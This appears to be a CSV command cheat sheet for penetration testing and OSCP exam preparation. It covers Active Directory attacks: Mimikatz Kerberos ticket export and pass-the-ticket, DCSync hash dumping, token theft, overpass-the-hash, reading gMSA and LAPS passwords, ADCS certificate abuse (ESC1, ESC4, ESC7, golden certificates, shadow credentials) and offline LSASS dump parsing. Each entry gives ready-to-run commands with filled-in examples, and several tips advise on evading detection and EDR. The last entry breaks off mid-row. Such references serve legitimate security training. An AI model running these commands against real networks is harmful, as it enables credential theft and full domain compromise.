"mimikatz-export-tickets","Mimikatz Export Kerberos Tickets to Disk","post-exploit","mimikatz # sekurlsa::tickets /export","Export all Kerberos tickets from memory to .kirbi files for Pass-the-Ticket attacks","credential-harvesting","","Exports TGT and TGS tickets. Look for krbtgt tickets (TGT) or service tickets. Use with kerberos::ptt to import elsewhere.","high","","","","","{""/export"": ""Save tickets to .kirbi files in current directory""}","","",""
"mimikatz-sekurlsa-tickets-export","Mimikatz Export Kerberos Tickets","post-exploit",".\mimikatz.exe ""privilege::debug"" ""sekurlsa::tickets /export"" ""exit""","Export all Kerberos tickets (TGT and TGS) from LSASS memory to .kirbi files. Enables Pass-the-Ticket attacks and ticket manipulation. Alternative to password/hash-based authentication.","credential-harvesting","","OSCP RELEVANCE: Pass-the-Ticket is less common in OSCP than Pass-the-Hash, but valuable when NTLM is disabled or for specific scenarios (e.g., reusing admin tickets).

TIME ESTIMATE: 3-5 minutes (1 min execute, 1 min download tickets, 1-3 min ticket analysis)

USING EXPORTED TICKETS:
1. WINDOWS: mimikatz.exe 'kerberos::ptt [0;3e7]-2-0-40e10000-admin@krbtgt-CORP.COM.kirbi' (inject into current session)
2. LINUX: impacket-ticketConverter [0;3e7]-2-0-40e10000-admin@krbtgt-CORP.COM.kirbi admin.ccache, then export KRB5CCNAME=admin.ccache
3. VERIFY: klist (Windows) or klist -c admin.ccache (Linux)

TICKET ANALYSIS:
- TGT (Type 2): Can request tickets for ANY service (most valuable)
- TGS (Type 0): Single service only (e.g., cifs/DC1 for SMB, http/WEBSERVER for HTTP)
- Look for: DA tickets, service account tickets, high-privilege user tickets

ALTERNATIVES:
- Rubeus.exe dump /service:krbtgt (modern C# alternative to Mimikatz)
- Rubeus.exe triage (list tickets without exporting)
- Invoke-Mimikatz -Command '""sekurlsa::tickets /export""' (PowerShell)

EXAM TIP: If you find TGT for Domain Admin, use it! Pass-the-Ticket can bypass some detection that catches Pass-the-Hash.","medium","","","","{""No tickets exported"": ""Possible causes: (1) No users have authenticated via Kerberos (only NTLM used), (2) Tickets expired (TGT default 10 hours), (3) Credential Guard enabled. Solution: Check ticket existence first: mimikatz.exe 'sekurlsa::tickets' (without /export). If no tickets shown, use NTLM-based attacks (Pass-the-Hash) instead. Alternative: Request new TGT with Rubeus.exe asktgt /user:<USER> /rc4:<NTLM_HASH>"", ""Access errors"": ""See mimikatz-sekurlsa-logonpasswords troubleshooting - same LSASS access requirements apply.""}","{""privilege::debug"": ""Enables SeDebugPrivilege (see mimikatz-sekurlsa-logonpasswords for detailed explanation). Required for LSASS memory access."", ""sekurlsa::tickets"": ""Extracts Kerberos tickets from LSASS memory. Windows caches Kerberos TGT (Ticket Granting Ticket) and TGS (Service Ticket) for authenticated sessions. WHY THIS MATTERS: Tickets can be reused for authentication without passwords or hashes. TGT lifetime: typically 10 hours. TGS lifetime: varies by service."", ""/export"": ""Writes extracted tickets to .kirbi files in current directory. Format: [0;3e7]-2-0-40e10000-user@krbtgt-DOMAIN.COM.kirbi. Naming: [LogonID]-[TicketType]-[Flags]-[KeyType]-user@service-DOMAIN.kirbi. WHY EXPORT: Tickets can be imported into current session (kerberos::ptt) or used from Linux (impacket-ticketConverter). OSCP USE: Pass-the-Ticket for lateral movement without knowing passwords/hashes."", ""Ticket types"": ""Type 2 = TGT (Ticket Granting Ticket) - reusable for any service. Type 0 = TGS (Service Ticket) - specific service only. CRITICAL: TGT is most valuable (works for all services). TGS only works for one service (e.g., cifs/SERVER for SMB access).""}","","",""
"mimikatz","Start Mimikatz Interactive Mode","post-exploit",".\mimikatz.exe","Start Mimikatz in interactive mode for credential harvesting and Kerberos attacks","credential-harvesting","","Starts Mimikatz interactive prompt. Run privilege::debug first, then sekurlsa::logonpasswords. For one-liner: mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" ""exit""","high","","","","","","","",""
"kerberos-rubeus-ptt","Rubeus Pass-the-Ticket","active-directory","Rubeus.exe ptt /ticket:<TICKET_FILE>","Inject Kerberos ticket into current session for Pass-the-Ticket attack","kerberos-attacks","Rubeus.exe ptt /ticket:admin.kirbi","Injects exported ticket into current logon session. Verify with klist after injection. Use tickets exported from mimikatz sekurlsa::tickets /export.","high","","","","","{""/ticket"": ""Path to .kirbi file or base64-encoded ticket to inject""}","","",""
"mimikatz-privilege-debug","Mimikatz Enable Debug Privilege","utilities",".\mimikatz.exe ""privilege::debug"" ""exit""","Enable SeDebugPrivilege for current process. Prerequisite for LSASS memory access. Test command to verify Mimikatz will work before running credential extraction.","privilege-escalation","","OSCP TIP: Always test 'privilege::debug' FIRST before attempting credential extraction. If this fails, you don't have proper admin rights - troubleshoot before running sekurlsa commands.

TIME ESTIMATE: 10 seconds

DEBUG WORKFLOW:
1. Verify local admin: whoami /groups | findstr Administrators
2. Test privilege: .\mimikatz.exe ""privilege::debug"" ""exit""
3. If success: Proceed with sekurlsa::logonpasswords
4. If failure: Troubleshoot admin rights

ALTERNATIVE CHECK:
- Windows: whoami /priv | findstr SeDebugPrivilege (should show 'Disabled' for admin)
- PowerShell: [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)","high","","","","{""Privilege '20' error c0000061"": ""Not running as local administrator. Solution: Verify with 'whoami /groups' - must see 'BUILTIN\\Administrators' and 'Mandatory Label\\High Mandatory Level'. If using remote tools: Evil-WinRM (-u DOMAIN\\admin -p pass), PSExec (-u DOMAIN\\admin -p pass), or WMIExec. Alternative: Escalate locally with privilege escalation exploit.""}","{""privilege::debug"": ""Requests SeDebugPrivilege token for current process. SeDebugPrivilege is a Windows security privilege that allows debugging of any process, regardless of ownership. WHY NEEDED: LSASS process runs as NT AUTHORITY\\SYSTEM. Even local administrators cannot access SYSTEM processes without SeDebugPrivilege. SUCCESS: Returns 'Privilege '20' OK'. Number 20 = SE_DEBUG_NAME constant."", ""Use case"": ""Run this BEFORE attempting sekurlsa commands to verify you have necessary privileges. Faster than running full credential extraction only to fail. TIME SAVED: 30 seconds to verify vs 2 minutes to attempt full extraction and fail.""}","","","[""mimikatz-sekurlsa-logonpasswords""]"
"gmsadumper","gMSADumper - Read gMSA Password","post-exploit","python3 gMSADumper.py -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>'","Extract Group Managed Service Account password via LDAP","credential-dumping","python3 gMSADumper.py -u 'user' -p 'P@ssw0rd123!' -d 'corp.local'","GROUP MANAGED SERVICE ACCOUNTS (gMSA):
Automatically rotating passwords managed by AD.

WHO CAN READ:
Only principals in msDS-GroupMSAMembership attribute.
BloodHound: ReadGMSAPassword edge shows who can read.

USE CASES:
- Service accounts configured as gMSA
- Often over-privileged (DA membership, admin on servers)

OUTPUT:
Returns cleartext password and NT hash.
Use hash with pass-the-hash or password with normal auth.","high","","","","{""Access denied"": ""User lacks msDS-GroupMSAMembership read rights"", ""No gMSA found"": ""No gMSA accounts configured in domain""}","{""-u"": ""Username with ReadGMSAPassword rights"", ""-p"": ""Password for authentication"", ""-d"": ""Domain name (FQDN)"", ""-dc-ip"": ""Domain controller IP (optional)""}","","[""bloodyad-gmsa""]","[""evil-winrm-shell"", ""psexec-shell""]"
"bloodyad-gmsa","BloodyAD - Read gMSA Password","post-exploit","bloodyAD -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --host '<DC_IP>' get object '<GMSA_ACCOUNT>$' --attr msDS-ManagedPassword","Extract gMSA password using BloodyAD tool","credential-dumping","bloodyAD -d 'corp.local' -u 'user' -p 'P@ssw0rd123!' --host '192.168.50.70' get object 'svc_gmsa$' --attr msDS-ManagedPassword","Alternative to gMSADumper using BloodyAD.

REQUIRES:
- Principal must be in msDS-GroupMSAMembership of the gMSA

FIND gMSA ACCOUNTS:
bloodyAD get writable --otype msDS-GroupManagedServiceAccount","high","","","","{""Access denied"": ""User cannot read gMSA password""}","{""-d"": ""Domain name"", ""-u"": ""Username"", ""-p"": ""Password"", ""--host"": ""Domain controller"", ""get object"": ""Read AD object attributes"", ""--attr"": ""Specific attribute to read""}","","[""gmsadumper""]","[""evil-winrm-shell""]"
"laps-password-cme","CrackMapExec - Read LAPS Password","post-exploit","crackmapexec smb <TARGET> -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' --laps","Read LAPS password from AD using CrackMapExec","credential-dumping","crackmapexec smb 192.168.50.0/24 -u 'user' -p 'P@ssw0rd123!' -d 'corp.local' --laps","LAPS (LOCAL ADMINISTRATOR PASSWORD SOLUTION):
Stores local admin password in AD attribute ms-MCS-AdmPwd.

WHO CAN READ:
By default: Domain Admins, delegated groups
BloodHound: ReadLAPSPassword edge

USE CASES:
- Read password for local admin on workstations
- Lateral movement without domain creds

LAPS v2 (Windows LAPS):
New attribute: msLAPS-Password
Supports password encryption
Use --laps-password to auto-auth with retrieved password","high","","","","{""No LAPS password found"": ""LAPS not configured or user lacks read rights"", ""Access denied"": ""User cannot read ms-MCS-AdmPwd attribute""}","{""--laps"": ""Retrieve LAPS password for computers"", ""--laps-password"": ""Use LAPS password for authentication (after retrieval)""}","","[""laps-password-ldapsearch""]","[""psexec-shell"", ""evil-winrm-shell""]"
"laps-password-ldapsearch","ldapsearch - Read LAPS Password","post-exploit","ldapsearch -x -H ldap://<DC_IP> -D '<USERNAME>@<DOMAIN>' -w '<PASSWORD>' -b 'dc=<DC1>,dc=<DC2>' '(name=<COMPUTER_NAME>)' ms-MCS-AdmPwd","Read LAPS password directly via LDAP query","credential-dumping","ldapsearch -x -H ldap://192.168.50.70 -D 'user@corp.local' -w 'P@ssw0rd123!' -b 'dc=corp,dc=local' '(name=WS01)' ms-MCS-AdmPwd","MANUAL LAPS READ:
Useful when CrackMapExec not available.

FOR LAPS v2 (Windows LAPS):
Use attribute: msLAPS-Password

LIST ALL LAPS PASSWORDS:
ldapsearch -x -H ldap://<DC_IP> -D 'user@domain' -w 'pass' -b 'dc=corp,dc=local' '(ms-MCS-AdmPwd=*)' name ms-MCS-AdmPwd","medium","","","","{""No such object"": ""Computer not found - check name spelling"", ""Invalid credentials"": ""Check username format and password""}","{""-x"": ""Simple authentication (not SASL)"", ""-H"": ""LDAP server URI"", ""-D"": ""Bind DN (user@domain format)"", ""-w"": ""Bind password"", ""-b"": ""Search base DN"", ""ms-MCS-AdmPwd"": ""LAPS password attribute""}","","[""laps-password-cme""]","[""psexec-shell""]"
"powerview-gmsa","PowerView - Read gMSA Password (Windows)","post-exploit","Get-ADServiceAccount -Identity '<GMSA_ACCOUNT>' -Properties 'msDS-ManagedPassword' | Select-Object -ExpandProperty 'msDS-ManagedPassword'","Read gMSA password using PowerView from Windows","credential-dumping","Get-ADServiceAccount -Identity 'svc_gmsa' -Properties 'msDS-ManagedPassword' | Select-Object -ExpandProperty 'msDS-ManagedPassword'","WINDOWS gMSA READ:
Requires Active Directory PowerShell module.

PARSE PASSWORD:
$blob = Get-ADServiceAccount ... | ...
$password = ConvertFrom-ADManagedPasswordBlob $blob
$secpassword = $password.SecureCurrentPassword
$plaintext = [Net.NetworkCredential]::new('', $secpassword).Password","high","","","","{""Access denied"": ""User lacks gMSA read rights""}","{""Get-ADServiceAccount"": ""AD module cmdlet for service accounts"", ""-Identity"": ""Account name"", ""-Properties"": ""Attributes to retrieve"", ""msDS-ManagedPassword"": ""gMSA password blob""}","","[""gmsadumper""]",""
"certipy-find","Certipy - Find ADCS Vulnerabilities","enumeration","certipy find -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable -stdout","Enumerate AD Certificate Services for ESC1-ESC13 misconfigurations and attack paths","active-directory","certipy find -u 'user@corp.local' -p 'Password123' -dc-ip 192.168.50.70 -vulnerable -stdout","CERTIPY is the primary Linux tool for ADCS enumeration and exploitation.

WHAT IT FINDS:
- ESC1: Template allows requestor to supply Subject Alternative Name (SAN)
- ESC2: Template has 'Any Purpose' EKU or no EKU
- ESC3: Certificate Request Agent templates
- ESC4: Vulnerable template ACLs (WriteDacl, WriteOwner, etc.)
- ESC5: Vulnerable PKI object ACLs
- ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA
- ESC7: ManageCA/ManageCertificates permissions
- ESC8: HTTP enrollment with NTLM relay
- ESC9-13: Various certificate binding weaknesses

OSCP TIP:
ADCS is increasingly common in exams. ESC1 and ESC4 are most exploitable.","high","","","","{""Connection refused"": ""Check DC IP and port 389/636 accessibility"", ""Invalid credentials"": ""Verify username format (user@domain) and password""}","{""-u"": ""Username in UPN format (user@domain)"", ""-p"": ""Password for authentication"", ""-dc-ip"": ""Domain controller IP for LDAP queries"", ""-vulnerable"": ""Only show vulnerable templates and CAs"", ""-stdout"": ""Output to terminal (also saves JSON/TXT files)"", ""-old-bloodhound"": ""Output BloodHound 4.x compatible format"", ""-text"": ""Output text format instead of JSON""}","","[""certify-find""]","[""certipy-req-esc1"", ""certipy-req-esc4""]"
"certipy-req-esc1","Certipy - ESC1 Certificate Request","exploitation","certipy req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -target '<CA_HOST>' -template '<TEMPLATE>' -upn '<TARGET_USER>@<DOMAIN>'","Exploit ESC1 - request certificate as another user via Subject Alternative Name","active-directory","certipy req -u 'user@corp.local' -p 'P@ssw0rd123!' -ca 'corp-CA' -target 'ca.corp.local' -template 'UserAuth' -upn 'administrator@corp.local'","ESC1 ATTACK:
Templates with 'CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT' allow requestor to specify the Subject Alternative Name (SAN).

This means you can request a certificate for ANY user (including administrator@domain).

ATTACK FLOW:
1. certipy find -vulnerable (identify ESC1 templates)
2. certipy req -upn administrator@domain (request cert as admin)
3. certipy auth -pfx admin.pfx (authenticate with cert to get NT hash)

REQUIREMENTS:
- Template must allow client authentication (EKU)
- Attacker must have enrollment rights on template
- CA must be accessible

OSCP TIP:
ESC1 is the most common and easiest ADCS attack. Always check for it first.","high","","","","{""CERTSRV_E_TEMPLATE_DENIED"": ""User cannot enroll in this template - check ACLs"", ""Template not found"": ""Verify exact template name from certipy find""}","{""-ca"": ""Certificate Authority name (from certipy find output)"", ""-target"": ""CA server hostname or IP"", ""-template"": ""Vulnerable certificate template name"", ""-upn"": ""User Principal Name to impersonate in the certificate""}","[""certipy-find""]","[""certify-request""]","[""certipy-auth""]"
"certipy-auth","Certipy - Authenticate with Certificate","exploitation","certipy auth -pfx '<PFX_FILE>' -dc-ip <DC_IP>","Use certificate to authenticate via PKINIT and retrieve NT hash","active-directory","certipy auth -pfx 'administrator.pfx' -dc-ip 192.168.50.70","PKINIT AUTHENTICATION:
Uses certificate to request TGT via Kerberos PKINIT.

The DC returns the user's NT hash encrypted with the session key.

Certipy extracts this hash for pass-the-hash attacks.

OUTPUT:
Returns NT hash that can be used with:
- Evil-WinRM: evil-winrm -i <target> -u <user> -H <hash>
- PSExec: impacket-psexec <domain>/<user>@<target> -hashes :<hash>
- CrackMapExec: cme smb <target> -u <user> -H <hash>","high","","","","{""KDC_ERR_PADATA_TYPE_NOSUPP"": ""DC does not support PKINIT - try older DC or different attack"", ""KDC_ERR_CLIENT_NOT_TRUSTED"": ""Certificate not trusted - check CA chain""}","{""-pfx"": ""PFX certificate file containing cert and private key"", ""-dc-ip"": ""Domain controller for PKINIT authentication"", ""-domain"": ""Override domain (optional)"", ""-username"": ""Override username (optional)""}","[""certipy-req-esc1""]","","[""psexec-shell"", ""evil-winrm-shell"", ""wmiexec-shell""]"
"certipy-req-esc4","Certipy - ESC4 Template Modification","exploitation","certipy template -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -template '<TEMPLATE>' -save-old","Exploit ESC4 - modify vulnerable template to enable ESC1, then request cert","active-directory","certipy template -u 'user@corp.local' -p 'P@ssw0rd123!' -template 'UserAuth' -save-old","ESC4 ATTACK:
If you have WriteDacl/WriteOwner/GenericAll on a certificate template, you can modify it to enable ESC1.

ATTACK FLOW:
1. certipy template -save-old (backup original, enable ESC1 flags)
2. certipy req -upn administrator@domain (request cert as admin)
3. certipy template -configuration old.json (restore original template)
4. certipy auth -pfx admin.pfx (use cert to get hash)

ALWAYS RESTORE:
Use -save-old flag and restore template after attack to avoid detection.","high","","","","{""Access denied"": ""User does not have write access to template""}","{""-template"": ""Template name to modify"", ""-save-old"": ""Save original template config for restoration"", ""-configuration"": ""Custom configuration file (optional)""}","[""certipy-find""]","","[""certipy-req-esc1""]"
"certipy-req-esc7","Certipy - ESC7 ManageCA Abuse","exploitation","certipy ca -ca '<CA_NAME>' -add-officer '<USERNAME>' -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>'","Exploit ESC7 - use ManageCA rights to approve pending certificate requests","active-directory","certipy ca -ca 'corp-CA' -add-officer 'user' -u 'user@corp.local' -p 'P@ssw0rd123!'","ESC7 ATTACK:
ManageCA permission allows modifying CA configuration.

ATTACK FLOW:
1. Add yourself as certificate officer: certipy ca -add-officer
2. Enable SubjectAltRequireUpn template: certipy ca -enable-template SubjectAltRequireUpn
3. Request certificate with ESC1: certipy req -template SubjectAltRequireUpn
4. Authenticate: certipy auth -pfx file.pfx

ALTERNATIVE:
With ManageCertificates, you can approve pending requests directly.","high","","","","{""Access denied"": ""User does not have ManageCA rights""}","{""-ca"": ""Target Certificate Authority name"", ""-add-officer"": ""Add user as certificate officer (ManageCertificates)"", ""-enable-template"": ""Enable a disabled template""}","[""certipy-find""]","","[""certipy-req-esc1""]"
"certipy-forge","Certipy - Forge Certificate (GoldenCert)","exploitation","certipy forge -ca-pfx '<CA_PFX>' -upn '<TARGET_USER>@<DOMAIN>' -subject 'CN=<TARGET_USER>,CN=Users,DC=<DC1>,DC=<DC2>'","Forge certificate using compromised CA private key - Golden Certificate attack","active-directory","certipy forge -ca-pfx 'ca.pfx' -upn 'administrator@corp.local' -subject 'CN=administrator,CN=Users,DC=corp,DC=local'","GOLDEN CERTIFICATE:
Similar to Golden Ticket but uses CA private key instead of krbtgt hash.

If CA private key is compromised (via backup, DPAPI, etc.), you can forge certificates for ANY user.

REQUIRES:
- CA private key (obtained via backup theft, DPAPI, or CA server compromise)

PERSISTENCE:
Golden certs remain valid until CA key is rotated (rarely done).","medium","","","","{""Invalid PFX"": ""CA private key file is corrupted or wrong format""}","{""-ca-pfx"": ""CA private key in PFX format"", ""-upn"": ""User Principal Name for the forged certificate"", ""-subject"": ""Certificate subject DN""}","","","[""certipy-auth""]"
"certipy-shadow","Certipy - Shadow Credentials Attack","exploitation","certipy shadow auto -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -account '<TARGET_ACCOUNT>'","Add shadow credentials to account for certificate-based authentication","active-directory","certipy shadow auto -u 'user@corp.local' -p 'P@ssw0rd123!' -account 'DC01$'","SHADOW CREDENTIALS:
Adds key credential link to target's msDS-KeyCredentialLink attribute.

Allows certificate-based authentication as that account.

REQUIRES:
- GenericWrite/GenericAll/WriteProperty on target account
- ADCS with working PKINIT

USE CASES:
- Compromise computer accounts (DC01$)
- Compromise service accounts
- Lateral movement without password","high","","","","{""Access denied"": ""User lacks GenericWrite/GenericAll on target""}","{""shadow"": ""Shadow credentials subcommand"", ""auto"": ""Automatic attack mode"", ""-account"": ""Target account to add shadow credentials to""}","","","[""psexec-shell"", ""evil-winrm-shell""]"
"certify-find","Certify - Find ADCS Vulnerabilities (Windows)","enumeration","Certify.exe find /vulnerable","Windows tool to enumerate ADCS misconfigurations","active-directory","","CERTIFY is the Windows equivalent of Certipy.

Use when:
- You have Windows shell access
- Certipy is blocked or unavailable
- Need .NET-based execution

OUTPUT:
Shows vulnerable templates with exploitation guidance.","high","","","","{""Access denied"": ""Run from domain-joined system with valid credentials""}","{""find"": ""Enumerate certificate templates and CAs"", ""/vulnerable"": ""Only show vulnerable configurations"", ""/domain"": ""Specify target domain"", ""/ca"": ""Specify CA to query""}","","[""certipy-find""]","[""certify-request""]"
"certify-request","Certify - Request Certificate (Windows)","exploitation","Certify.exe request /ca:<CA_NAME> /template:<TEMPLATE> /altname:<TARGET_USER>","Request certificate from Windows using vulnerable template","active-directory","Certify.exe request /ca:ca.corp.local\corp-CA /template:UserAuth /altname:administrator","After getting certificate:
1. Convert to PFX: openssl pkcs12 -in cert.pem -keyex -CSP 'Microsoft Enhanced Cryptographic Provider v1.0' -export -out cert.pfx
2. Use Rubeus: Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /ptt","high","","","","{""Access denied"": ""User cannot enroll in template""}","{""/ca"": ""Certificate Authority in format server\\CAname"", ""/template"": ""Template to use for request"", ""/altname"": ""Subject Alternative Name (user to impersonate)""}","[""certify-find""]","[""certipy-req-esc1""]","[""rubeus-asktgt-cert""]"
"rubeus-asktgt-cert","Rubeus - Request TGT with Certificate","exploitation","Rubeus.exe asktgt /user:<TARGET_USER> /certificate:<PFX_FILE> /password:<PFX_PASSWORD> /ptt","Use Rubeus to authenticate with certificate and request TGT","active-directory","Rubeus.exe asktgt /user:administrator /certificate:C:\Temp\admin.pfx /password:password123 /ptt","Windows equivalent of certipy auth.

Use /ptt to inject ticket into current session for immediate use.

Without /ptt, outputs Base64 ticket for later injection.","high","","","","{""KDC_ERR_PADATA_TYPE_NOSUPP"": ""PKINIT not enabled on DC""}","{""/user"": ""Username to request TGT for"", ""/certificate"": ""Path to PFX certificate file"", ""/password"": ""PFX password (if encrypted)"", ""/ptt"": ""Pass-the-Ticket - inject TGT into current session"", ""/nowrap"": ""Don't wrap Base64 output""}","[""certify-request""]","[""certipy-auth""]","[""psexec-shell""]"
"mimikatz-overpass-the-hash","Overpass-the-Hash (Pass-the-Key)","active-directory","mimikatz.exe ""sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:cmd.exe""","Convert NTLM hash to Kerberos ticket by requesting TGT from KDC. Opens new cmd.exe with Kerberos context. Unlike Pass-the-Hash (NTLM auth), this enables Kerberos-based lateral movement.","credential-attacks","mimikatz.exe ""sekurlsa::pth /user:administrator /domain:corp.com /ntlm:aad3b435b51404eeaad3b435b51404ee /run:cmd.exe""","CRITICAL: After Overpass-the-Hash, use HOSTNAME not IP!

  CORRECT: dir \\DC01\C$ (Kerberos auth, uses ticket)
  WRONG: dir \\10.0.0.1\C$ (NTLM auth, ignores ticket!)

IP addresses force Windows to use NTLM instead of Kerberos. The forged ticket is only used for Kerberos authentication.

Verify ticket with: klist (in the new window)

Time estimate: <10 seconds","high","","","","{""KDC_ERR_C_PRINCIPAL_UNKNOWN"": ""User doesn't exist in AD. Verify username with: net user <username> /domain. Check for typos."", ""New window opens but no Kerberos ticket"": ""DC may be unreachable. Verify: nltest /dsgetdc:<domain>. Check firewall allows Kerberos (TCP/UDP 88)."", ""Hash format invalid"": ""Ensure 32 hex characters (0-9, a-f). No colons or spaces. Just the NT hash, not 'LM:NT' format.""}","{""sekurlsa::pth"": ""Pass-the-Hash module that creates a new process with injected credentials. Unlike standard PTH (NTLM), this requests a Kerberos TGT from the KDC using the NTLM hash, enabling Kerberos-based authentication."", ""/user"": ""Target username without domain prefix. The domain is specified separately with /domain."", ""/domain"": ""Target domain FQDN. CRITICAL: Use FQDN (corp.com) not NetBIOS (CORP). Kerberos requires proper domain format."", ""/ntlm"": ""NTLM hash (NT hash, not LM). 32 hexadecimal characters. Obtained from sekurlsa::logonpasswords, lsadump::sam, or secretsdump.py."", ""/run"": ""Program to launch with the new Kerberos context. Default: cmd.exe. Can specify any executable (powershell.exe, mmc.exe, etc.).""}","[""mimikatz-sekurlsa-logonpasswords""]","[""impacket-psexec"", ""impacket-wmiexec""]","[""ad-golden-ticket-mimikatz-create"", ""ad-silver-ticket-mimikatz-create""]"
"mimikatz-token-elevate","Elevate to SYSTEM Token","post-exploit","mimikatz.exe ""privilege::debug"" ""token::elevate"" ""exit""","Elevate current mimikatz process to SYSTEM token by stealing from a SYSTEM process. Required before lsadump commands. Provides highest local privilege level.","privilege-escalation","","Run BEFORE lsadump commands (sam, secrets, cache). SYSTEM token is required to access LSA secrets and SAM database.

Alternative: token::elevate /domainadmin - steals Domain Admin token if available (useful for DCSync from workstation).

Verify elevation: token::whoami

Time estimate: <5 seconds","high","","","","{""Privilege '20' not granted"": ""Not running as local admin. Verify: whoami /groups (look for S-1-5-32-544 Administrators). Elevate shell first."", ""token::elevate fails"": ""No SYSTEM process available or access denied. Try: token::elevate /domainadmin to steal DA token instead.""}","{""privilege::debug"": ""Enables SeDebugPrivilege, required for accessing LSASS memory and manipulating other process tokens. Requires local admin rights."", ""token::elevate"": ""Impersonates SYSTEM token by duplicating a token from a SYSTEM-level process (lsass.exe, winlogon.exe). Elevates mimikatz to SYSTEM context.""}","","","[""mimikatz-lsadump-sam"", ""mimikatz-lsadump-secrets"", ""mimikatz-lsadump-cache""]"
"mimikatz-token-elevate-domainadmin","Elevate to Domain Admin Token","post-exploit","mimikatz.exe ""privilege::debug"" ""token::elevate /domainadmin"" ""exit""","Steal Domain Admin token from logged-in DA session. Enables domain-level operations (DCSync) from a workstation without being Domain Admin yourself.","privilege-escalation","","PRIORITY TARGET: Machines with DA sessions (detected by BloodHound HasSession edges).

After stealing DA token, you can run DCSync from this workstation!
  mimikatz # lsadump::dcsync /domain:corp.com /all

Time estimate: <5 seconds (if DA session exists)","medium","","","","{""No Domain Admin token found"": ""No DA is logged into this machine. Check sessions: qwinsta /server:<hostname>. Target machines with DA sessions detected by BloodHound.""}","{""privilege::debug"": ""Enables SeDebugPrivilege for cross-process token access."", ""token::elevate /domainadmin"": ""Searches all processes for Domain Admin tokens and impersonates the first one found. Requires DA to be logged in on this machine.""}","","[""mimikatz-sekurlsa-logonpasswords""]","[""mimikatz-dcsync-all""]"
"mimikatz-token-revert","Revert to Original Token","post-exploit","mimikatz.exe ""token::revert"" ""exit""","Revert from impersonated token (SYSTEM, DA) back to original user context. Useful for cleanup or when impersonation causes issues.","privilege-escalation","","Rarely needed. Use if SYSTEM context causes permission issues (network operations sometimes require user token).

Time estimate: <1 second","low","","","","","{""token::revert"": ""Reverts to the original process token, undoing any token::elevate impersonation.""}","","",""
"mimikatz-dcsync-user","DCSync Single User","active-directory","mimikatz.exe ""lsadump::dcsync /domain:<DOMAIN> /user:<TARGET_USER>""","Extract password hash for a single user via DCSync (Directory Replication Service). Remote attack - no code execution on DC required. Requires DA or DCSync rights.","credential-extraction","mimikatz.exe ""lsadump::dcsync /domain:corp.com /user:Administrator""","TARGETED extraction - use for specific high-value accounts:
  - krbtgt: For Golden Ticket
  - Administrator: Domain admin access
  - Service accounts: For Silver Tickets

For full domain dump, use /all flag instead.

Time estimate: <30 seconds per user","high","","","","{""GetNCChanges: 0x00002105"": ""Insufficient privileges. Requires DS-Replication-Get-Changes and DS-Replication-Get-Changes-All extended rights. Need Domain Admin or explicit DCSync rights."", ""RPC server unavailable"": ""Cannot reach DC. Check: nltest /dsgetdc:<domain>. Verify firewall allows RPC (135, 445, dynamic).""}","{""lsadump::dcsync"": ""Simulates Domain Controller replication to request password hashes. Uses MS-DRSR (Directory Replication Service Remote Protocol)."", ""/domain"": ""Target domain FQDN."", ""/user"": ""Specific user account to extract. Common targets: Administrator, krbtgt (for Golden Ticket), service accounts.""}","","[""ad-dcsync-impacket-secretsdump-user""]","[""ad-golden-ticket-mimikatz-create"", ""ad-silver-ticket-mimikatz-create""]"
"mimikatz-dcsync-all","DCSync All Domain Hashes","active-directory","mimikatz.exe ""lsadump::dcsync /domain:<DOMAIN> /all /csv""","Extract ALL domain password hashes via DCSync. Complete domain credential dump. Output in CSV format for easy parsing.","credential-extraction","mimikatz.exe ""lsadump::dcsync /domain:corp.com /all /csv""","FULL DOMAIN DUMP - game over for AD security.

Save output: mimikatz ""log dcsync.txt"" ""lsadump::dcsync /domain:<DOMAIN> /all /csv"" ""exit""

Impacket alternative (usually faster):
  secretsdump.py -just-dc '<DOMAIN>/<DA_USER>:<PASSWORD>'@<DC_IP>

Time estimate: 1-5 minutes depending on domain size","high","","","","","{""lsadump::dcsync"": ""DCSync attack using directory replication protocol."", ""/domain"": ""Target domain FQDN."", ""/all"": ""Extract all user accounts in the domain."", ""/csv"": ""Output in CSV format (easier to parse, import into tools).""}","","","[""ad-golden-ticket-mimikatz-create""]"
"mimikatz-sekurlsa-ekeys","Extract Kerberos Encryption Keys","active-directory","mimikatz.exe ""privilege::debug"" ""sekurlsa::ekeys"" ""exit""","Extract Kerberos encryption keys (AES128, AES256, DES, RC4) from LSASS memory. AES keys enable stealthier ticket forgery than NTLM hashes.","credential-extraction","","AES keys are STEALTHIER for ticket forgery:
  - RC4 tickets flagged by modern EDR
  - AES256 is the modern standard

Use AES key with Rubeus for Golden/Silver tickets:
  Rubeus.exe golden /aes256:<AES_KEY> ...

Time estimate: <10 seconds","medium","","","","","{""privilege::debug"": ""Required for LSASS memory access."", ""sekurlsa::ekeys"": ""Extracts Kerberos encryption keys from all logon sessions. Shows AES256, AES128, DES-CBC-MD5, and RC4 (NTLM) keys.""}","[""mimikatz-privilege-debug""]","[""mimikatz-sekurlsa-logonpasswords""]","[""ad-golden-ticket-rubeus-create"", ""ad-silver-ticket-rubeus-create""]"
"mimikatz-minidump-parse","Parse LSASS Minidump Offline","post-exploit","mimikatz.exe ""sekurlsa::minidump <DUMP_FILE>"" ""sekurlsa::logonpasswords"" ""exit""","Parse LSASS memory dump offline. Use when live extraction is blocked (Credential Guard, EDR). Dump created with procdump, comsvcs.dll, or Task Manager.","credential-extraction","mimikatz.exe ""sekurlsa::minidump lsass.dmp"" ""sekurlsa::logonpasswords"" ""exit""","CREATE DUMP ON TARGET:
  # Method 1: Task Manager (GUI)
  Task Manager  Details  lsass.exe  Create dump file

  # Method 2: Procdump (Sysinternals)
  procdump.exe -ma lsass.exe lsass.dmp

